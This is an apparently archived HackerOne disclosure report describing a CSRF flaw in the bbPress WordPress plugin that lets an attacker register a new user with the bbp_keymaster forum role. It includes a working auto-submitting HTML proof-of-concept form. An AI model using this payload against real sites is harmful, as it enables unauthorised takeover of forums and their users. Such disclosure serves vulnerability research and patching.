# Pivilege escalation of any new user to Keymaster caused by CSRF

## Metadata
- **Source:** HackerOne
- **Report:** 2999394 | https://hackerone.com/reports/2999394
- **Submitted:** 2025-02-18
- **Reporter:** br3n
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Privilege Escalation
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can escalate a newly registered user's forum role to bbp_keymaster without proper authentication. This occurs because bbPress fails to implement adequate CSRF protections when assigning forum roles, allowing an attacker to craft a malicious request that upgrades a targeted user’s forum privileges upon registration.

When an authenticated admin user visits the link, an new user is regis

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

An attacker can escalate a newly registered user's forum role to bbp_keymaster without proper authentication. This occurs because bbPress fails to implement adequate CSRF protections when assigning forum roles, allowing an attacker to craft a malicious request that upgrades a targeted user’s forum privileges upon registration.

When an authenticated admin user visits the link, an new user is registered with the attacker's details, they receive an email containing login credentials.

Root Cause
The bbp_user_add_role_on_register function assigns a user role based on a user-controlled POST parameter (bbp-forums-role). 

## Steps To Reproduce:
1. Install and activate the bbpress plugin.
1. Here is my CSRF form for the PoC.
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body onload="document.getElementById('csrf-form').submit();">

    <form id="csrf-form" action="http://localhost/victim/wp-login.php" method="POST">
        <input type="hidden" name="user_login" value="evilpen">
        <input type="hidden" name="user_email" value="attacker@email.com">
        <input type="hidden" name="action" value="register">
        <input type="hidden" name="bbp-forums-role" value="bbp_keymaster">
    </form>

</body>
</html>
```
3. Set up your wordpress instance to send emails, in my case I used the plugin wp-smtp mail.
3. Send a link to an authenticated admin user, when the user opens the link, the forum role of the new user is "Keymaster".
## Recommendations

Implement CSRF Protection

## Impact

While the compromised user remains a WordPress subscriber and does not obtain full site-wide administrative privileges, the bbp_keymaster role grants complete control over the bbPress forum, including managing topics, users, and settings, an attacker could modify discussions, delete content, or manipulate user roles within bbPress.

</details>

---
*Analysed by Claude on 2026-05-24*
